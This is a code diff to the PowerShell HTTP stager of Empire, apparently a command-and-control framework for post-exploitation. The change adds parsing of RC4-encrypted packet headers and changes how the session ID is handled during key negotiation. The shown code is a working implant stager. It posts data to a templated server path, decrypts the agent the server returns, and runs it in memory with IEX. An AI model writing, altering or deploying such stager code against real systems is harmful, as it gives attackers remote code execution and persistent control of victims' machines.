+++ empire/server/data/agent/stagers/http_malleable/http_malleable.ps1
@@ -60,6 +60,33 @@ function Start-Negotiate {
         }
     }
 
+        function Decode-RC4Packet {
+        param ($RawData, $SKB)
+
+        $IV = $RawData[0..3];
+        $EncryptedData = $RawData[4..($RawData.Length - 1)];
+        $DecryptedData = ConvertTo-RC4ByteStream -RCK ($IV + $SKB) -In $EncryptedData;
+        $SessionID = [System.Text.Encoding]::ASCII.GetString($DecryptedData[0..7]);
+
+        $Language = $DecryptedData[8];
+        $Meta = $DecryptedData[9];
+        $Extra = $DecryptedData[10..11];
+
+        $Length = [BitConverter]::ToInt32($DecryptedData[12..15], 0);
+
+        $EncryptedPayload = $EncryptedData[16..($EncryptedData.Length - 1)];
+
+        return @{
+            IV = $IV;
+            SessionID = $SessionID;
+            Language = $Language;
+            Meta = $Meta;
+            Extra = $Extra;
+            Length = $Length;
+            EncryptedPayload = $EncryptedPayload;
+        }
+    }
+
     # make sure the appropriate assemblies are loaded
     $Null = [Reflection.Assembly]::LoadWithPartialName("System.Security");
     $Null = [Reflection.Assembly]::LoadWithPartialName("System.Core");
@@ -93,7 +120,7 @@ function Start-Negotiate {
     $rk=$rs.ToXmlString($False);
 
     # generate a randomized sessionID of 8 characters
-    $ID=-join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 8);
+    $ID='00000000';
 
     # build the packet of (xml_key)
     $ib=$e.getbytes($rk);
@@ -146,11 +173,15 @@ function Start-Negotiate {
     $raw=$wc.UploadData($s+"/{{ stage_1 }}","POST",$rc4p);
 
     # step 4 of negotiation -> server returns RSA(nonce+AESsession))
-    $de=$e.GetString($rs.decrypt($raw,$false));
+    $DecodedPacket = Decode-RC4Packet -RawData $raw -SKB $SKB;
+    $ID=$DecodedPacket.SessionID;
+
+    $EncryptedPayloadBytes = [byte[]]$DecodedPacket.EncryptedPayload;
+    $DecryptedData=$e.GetString($rs.decrypt($EncryptedPayloadBytes,$false));
 
     # packet = server nonce + AES session key
-    $nonce=$de[0..15] -join '';
-    $key=$de[16..$de.length] -join '';
+    $nonce=$DecryptedData[0..15] -join '';
+    $key=$DecryptedData[16..$DecryptedData.length] -join '';
 
     # increment the nonce
     $nonce=[String]([long]$nonce + 1);
@@ -240,7 +271,9 @@ function Start-Negotiate {
     # # decrypt the agent and register the agent logic
     # $data = $e.GetString($(Decrypt-Bytes -Key $key -In $raw));
     # write-host "data len: $($Data.Length)";
-    IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );
+    $DecodedPacket = Decode-RC4Packet -RawData $raw -SKB $SKB;
+    $EncryptedPayloadBytes = [byte[]]$DecodedPacket.EncryptedPayload;
+    IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $EncryptedPayloadBytes)) );
 
     # clear some variables out of memory and cleanup before execution
     $AES=$null;$s2=$null;$wc=$null;$eb2=$null;$raw=$null;$IV=$null;$wc=$null;$i=$null;$ib2=$null;